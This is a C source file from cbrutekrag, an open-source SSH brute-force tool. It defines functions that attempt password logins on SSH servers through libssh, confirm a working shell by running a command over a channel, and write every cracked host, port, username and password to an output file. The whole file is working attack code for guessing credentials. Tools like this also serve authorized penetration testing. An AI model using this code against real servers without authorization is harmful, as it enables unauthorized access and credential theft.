/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <stdint.h>
#include <stdio.h>

#include <libssh/libssh.h>

#include "cbrutekrag.h"
#include "log.h"
#include "progressbar.h"

int g_timeout;

int bruteforce_ssh_login(btkg_context_t *context, const char *hostname,
			 uint16_t port, const char *username,
			 const char *password)
{
	ssh_session my_ssh_session;
	int verbosity = 0;

	if (context->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
		verbosity = SSH_LOG_PROTOCOL;
	} else {
		verbosity = SSH_LOG_NOLOG;
	}

	my_ssh_session = ssh_new();

	if (my_ssh_session == NULL) {
		log_error("Cant create SSH session.");
		return -1;
	}

	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
#if LIBSSH_VERSION_MAYOR > 0 || \
	(LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
	ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
#endif
	ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);

	int r;
	r = ssh_connect(my_ssh_session);
	if (r != SSH_OK) {
		ssh_free(my_ssh_session);
		if (context->verbose & CBRUTEKRAG_VERBOSE_MODE) {
			log_error("[!] Error connecting to %s:%d %s.", hostname,
				  port, ssh_get_error(my_ssh_session));
		}
		return -1;
	}

	r = ssh_userauth_none(my_ssh_session, NULL);

	if (r == SSH_AUTH_SUCCESS) {
		log_debug("[!] %s:%d - Server without authentication.",
			  hostname, port);
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);

		return -1;
	}

	if (r == SSH_AUTH_ERROR) {
		log_debug(
			"[!] %s:%d - ssh_userauth_none(): A serious error happened.",
			hostname, port);
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);

		return -1;
	}

	int method = 0;

	method = ssh_userauth_list(my_ssh_session, NULL);

	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
		r = ssh_userauth_password(my_ssh_session, NULL, password);
		if (r == SSH_AUTH_SUCCESS) {
			ssh_channel channel = ssh_channel_new(my_ssh_session);

			if (channel == NULL) {
				log_debug("[!] %s:%d - Cannot create channel.",
					  hostname, port);
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
				return -1;
			}

			int ret = ssh_channel_open_session(channel);
			if (ret < 0) {
				ssh_channel_close(channel);
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
				return -1;
			}

			ret = ssh_channel_request_exec(channel,
						       "cat > /dev/null");
			if (ret < 0) {
				log_debug(
					"[!] %s:%d - Possible interactive login (ie SonicWall).",
					hostname, port);
				ssh_channel_close(channel);
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
				return -1;
			}

			ssh_disconnect(my_ssh_session);
			ssh_free(my_ssh_session);

			return 0;
		}
	}

	ssh_disconnect(my_ssh_session);
	ssh_free(my_ssh_session);
	return -1;
}

int bruteforce_ssh_try_login(btkg_context_t *context, const char *hostname,
			     const uint16_t port, const char *username,
			     const char *password, size_t count, size_t total,
			     FILE *output)
{
	int ret = bruteforce_ssh_login(context, hostname, port, username,
				       password);

	if (ret == 0) {
		log_info("\033[32m[+]\033[0m %s:%d %s %s", hostname, port,
			 username, password);
		if (output != NULL) {
			log_output(output, "\t%s:%d\t%s\t%s\n", hostname, port,
				   username, password);
		}
	} else {
		log_debug("\033[38m[-]\033[0m %s:%d %s %s", hostname, port,
			  username, password);
	}

	if (context->progress_bar) {
		char bar_suffix[50];
		sprintf(bar_suffix, "[%zu] %s:%d %s %s", count, hostname, port,
			username, password);
		progressbar_render(count, total, bar_suffix, 0);
	}

	return ret;
}
